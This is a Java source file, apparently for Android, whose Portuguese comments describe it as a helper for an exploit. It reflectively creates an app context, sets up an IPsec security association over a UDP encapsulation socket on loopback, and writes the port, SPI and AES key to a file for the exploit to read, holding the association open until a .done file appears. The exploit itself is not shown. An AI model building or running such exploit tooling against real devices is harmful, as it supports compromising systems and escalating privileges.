import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import java.io.File;
import java.io.FileWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;

public class SaHelper {
    public static void main(String[] args) throws Exception {
        // args: <outfile> <encap_port>
        String outfile = args[0];
        int encapPort = Integer.parseInt(args[1]);

        Class<?> activityThread = Class.forName("android.app.ActivityThread");
        activityThread.getMethod("main", String[].class).invoke(null, (Object) new String[0]);
        Context ctx = (Context) activityThread.getMethod("currentApplication").invoke(null);
        if (ctx == null) throw new IllegalStateException("sem Application context");
        System.err.println("ctx ok: " + ctx.getPackageName());

        IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
        InetAddress loopback = InetAddress.getByName("127.0.0.1");
        IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
        int eport = encapSock.getPort();
        IpSecManager.SecurityParameterIndex spi =
            ipsec.allocateSecurityParameterIndex(loopback);
        byte[] aesKey = new byte[32];
        new SecureRandom().nextBytes(aesKey);

        // transform inbound: remote = nosso proprio loopback; encap via socket
        IpSecTransform transform = new IpSecTransform.Builder(ctx)
            .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, encapSock.getPort())
            .buildTransportModeTransform(loopback, spi);

        // write params pro exploit ler
        StringBuilder sb = new StringBuilder();
        sb.append("encap_port=").append(eport).append('\n');
        sb.append("spi=").append(spi.getSpi()).append('\n');
        // hex da aes key
        StringBuilder hex = new StringBuilder();
        for (byte b : aesKey) hex.append(String.format("%02x", b));
        sb.append("aes_key=").append(hex).append('\n');
        try (FileWriter w = new FileWriter(outfile)) { w.write(sb.toString()); }

        System.err.println("SA params escritos em " + outfile);
        System.err.println("encap=" + eport + " spi=" + spi.getSpi());

        // MANTEM VIVO ate o exploit terminar: espera arquivo .done ou stdin EOF
        File done = new File(outfile + ".done");
        while (!done.exists()) Thread.sleep(500);
        transform.close();
        encapSock.close();
        System.err.println("SA fechada, tchau");
        System.exit(0);
    }
}
